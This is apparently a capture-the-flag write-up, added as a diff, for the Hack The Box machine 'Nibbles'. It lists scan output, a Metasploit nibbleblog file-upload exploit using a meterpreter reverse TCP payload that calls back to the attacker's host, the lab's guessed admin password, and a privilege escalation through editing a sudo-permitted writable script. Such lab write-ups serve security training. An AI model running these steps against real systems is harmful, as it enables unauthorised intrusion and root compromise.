@@ -1,0 +1,117 @@
+<h1>Nibbles 10.10.10.75</h1>
+
+<h2>Hosts & Services</h2>
+
+  address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+  -------      ---  ----  -------  ---------  -----  -------  ----  --------
+  10.10.10.75             Linux               3.X    server
+
+  host         port  proto  name  state  info
+  ----         ----  -----  ----  -----  ----
+  10.10.10.75  22    tcp    ssh   open   OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 Ubuntu Linux; protocol 2.0
+  10.10.10.75  80    tcp    http  open   Apache httpd 2.4.18 (Ubuntu)
+
+<h2>CMS INFO</h2>
+
+  http://10.10.10.75/nibbleblog/README
+    ===== Nibbleblog ======
+    Version: v4.0.3
+    Codename: Coffee
+    Release date: 2014-04-01
+    Sourcecode: https://github.com/dignajar/nibbleblog
+
+<h2>Nikto</h2>
+  Nikto v2.1.6
+  ---------------------------------------------------------------------------
+  + Target IP:          10.10.10.75
+  + Target Hostname:    10.10.10.75
+  + Target Port:        80
+  + Server: Apache/2.4.18 (Ubuntu)
+  + Cookie PHPSESSID created without the httponly flag
+  + The anti-clickjacking X-Frame-Options header is not present.
+  + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+  + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+  + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+  + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+  OSVDB-3268: /nibbleblog/admin/: Directory indexing found.
+  + OSVDB-3092: /nibbleblog/admin.php: This might be interesting...
+  + OSVDB-3092: /nibbleblog/admin/: This might be interesting...
+  + Server leaks inodes via ETags, header found with file /nibbleblog/README, fields: 0x1214 0x4f5f07d4d0b80
+  + OSVDB-3092: /nibbleblog/README: README file found.
+  + OSVDB-3092: /nibbleblog/install.php: install.php file found.
+  + OSVDB-3092: /nibbleblog/LICENSE.txt: License file found may identify site software.
+
+<h2>Metasploit</h2>
+  Module options (exploit/multi/http/nibbleblog_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       The password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST      10.10.10.75      yes       The target address
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  nibbleblog       yes       The base path to the web application
+   USERNAME                    yes       The username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+  Payload options (php/meterpreter_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.105     yes       The listen address
+   LPORT  4447             yes       The listen port
+
+  Exploit target:
+
+   Id  Name
+   --  ----
+   0   Nibbleblog 4.0.3
+
+  msf exploit(nibbleblog_file_upload) > set username admin
+  username => admin
+  msf exploit(nibbleblog_file_upload) > set password nibbles
+  password => nibbles
+  msf exploit(nibbleblog_file_upload) > exploit -z
+
+  [*] Started reverse TCP handler on 10.10.14.105:4447
+
+<h2>Priv esc</h2>
+  Listing: /home/nibbler/personal/stuff
+  =====================================
+
+  Mode              Size  Type  Last modified              Name
+  ----              ----  ----  -------------              ----
+  100777/rwxrwxrwx  4025  fil   2018-01-15 15:38:50 +0100  monitor.sh
+
+  sudo -l
+    Matching Defaults entries for nibbler on Nibbles:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    User nibbler may run the following commands on Nibbles:
+        (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+   shell
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+   file /home/nibbler/personal/stuff/monitor.sh must be edited to look like this:
+     #!/bin/sh
+     clear
+     cat /root/root.txt
+     echo -e cat /root/root.txt
+     sudo cat /root/root.txt
+
+    sudo /home/nibbler/personal/stuff/monitor.sh
+
+<h2>Spoilers</h2>
+  Username is admin (can be seen in a config file)
+  Password is nibbles (have to be guessed)
+
+
+<h2>SED - not used</h2>
+  To remove all digits present in every line of a file:
+    sed 's/[0-9]//g' monitor.sh
+  To remove all lower case alphabets present in every line:
+    sed 's/[a-z]//g' monitor.sh
+  Remove everything:
+    sed 's/[a-zA-Z0-9]//g' monitor.sh
+  sed -i 's/clear/cat \/root\/root.txt/g' monitor.sh
